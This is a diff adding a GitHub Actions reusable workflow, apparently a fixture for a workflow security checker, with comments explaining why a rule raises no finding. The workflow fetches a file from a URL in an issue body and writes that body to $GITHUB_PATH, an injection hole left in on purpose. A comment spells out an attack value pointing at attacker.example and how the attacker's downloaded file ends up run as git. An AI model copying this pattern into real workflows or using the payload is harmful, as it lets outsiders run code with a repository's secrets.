@@ -1,0 +1,34 @@
+# situation: the workflow is called; a run downloads a file a URL of
+#   github.event.issue.body names to /tmp/t/git and writes the body to
+#   $GITHUB_PATH, and git status runs after. Its one caller in the
+#   repository, ci.yml, runs on push.
+# reason: no added gain for this repository: ci.yml calls the workflow on
+#   push alone, and github.event of a push has no issue, so the value that the
+#   run reads is not a value that an attacker wrote. Another repository may
+#   call the workflow on an event whose payload has what an attacker wrote,
+#   but that run has the token and the secrets of the other repository.
+# cause: the rule reads a called workflow on the events of its callers in
+#   the repository, and ci.yml runs on push alone.
+# attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
+# attack-run-behavior: called on issues by a workflow of another repository,
+#   with an issue of this body: BODY holds three lines; mkdir makes /tmp/t,
+#   curl saves the file at https://attacker.example/git as /tmp/t/git, chmod
+#   makes it executable, and echo writes the lines
+#   https://attacker.example/git, /tmp/t and /tmp/PWNED to $GITHUB_PATH. The
+#   next step's PATH starts with /tmp/PWNED and /tmp/t (the line written
+#   last comes first), then the line of the URL, and git status runs
+#   /tmp/t/git, the attacker's file. Called by ci.yml on push, github.event
+#   has no issue, BODY is empty, and the step ends where curl fails on the
+#   empty URL.
+on:
+  workflow_call:
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          BODY: ${{ github.event.issue.body }}
+        run: |
+          mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
+          echo "$BODY" >> "$GITHUB_PATH"
+      - run: git status
